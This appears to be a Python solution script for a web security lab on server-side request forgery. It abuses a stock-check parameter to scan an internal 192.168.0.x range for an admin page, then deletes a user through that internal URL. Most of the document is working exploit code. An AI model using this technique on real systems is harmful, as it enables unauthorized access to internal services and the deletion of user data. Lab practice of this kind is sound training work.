# Lab: Basic SSRF against another back-end system

import requests

base = "https://0aea005d0480778081cc5c07003b007f.web-security-academy.net"
s=requests.Session()

print("===========[step1] Access to admin page===============")
page_admin=s.get(f"{base}/admin")
print(page_admin.text)

'''
"Not Found"
'''

print("===========[step2] Access Product Page===============")
page_product=s.get(f"{base}/product", params={"productId":"5"})
print(page_product.text)

'''
                        <form id="stockCheckForm" action="/product/stock" method="POST">
                            <select name="stockApi">
                                <option value="http://192.168.0.1:8080/product/stock/check?productId=5&storeId=1">London</option>
                                <option value="http://192.168.0.1:8080/product/stock/check?productId=5&storeId=2">Paris</option>
                                <option value="http://192.168.0.1:8080/product/stock/check?productId=5&storeId=3">Milan</option>
                            </select>
                            <button type="submit" class="button">Check stock</button>
                        </form>
                        <span id="stockCheckResult"></span>
                        <script src="/resources/js/stockCheckPayload.js"></script>
                        <script src="/resources/js/stockCheck.js"></script>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                        </div>
'''

print("===========[step3] Check stock===============")
page_stock = s.post(f"{base}/product/stock",
                    data={"stockApi": "http://192.168.0.1:8080/product/stock/check?productId=5&storeId=1"})
print(page_stock.status_code)
print(page_stock.text)   # 200, stock number (e.g. 318)

print("===========[step4] Access loop Admin Page with stockapi===============")
for num in range(1,256):
    admin_url_case=f"http://192.168.0.{num}:8080/admin"
    page_stock_admin_case = s.post(f"{base}/product/stock", data={"stockApi": admin_url_case}, allow_redirects=False, timeout=10)
    if page_stock_admin_case.status_code == 200:
        print("Found valid stockApi admin URL: ", admin_url_case)
        print(page_stock_admin_case.text)   # Bingo!
        break
else:
    raise SystemExit("admin not found") 

'''
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
'''

print("===========[step5] Delete Carlos Account===============")
#page_delete_carlos=s.get(f"{base}/admin/delete", params={"username":"carlos"}) 
# Even you get admin page you can't use above code, becaude still your session is not admin session

delete_url=admin_url_case + "/delete?username=carlos"
page_delete = s.post(f"{base}/product/stock", data={"stockApi": delete_url},
                     allow_redirects=False, timeout=10)
print(page_delete.status_code, page_delete.headers.get("Location"))   # 302, .../admin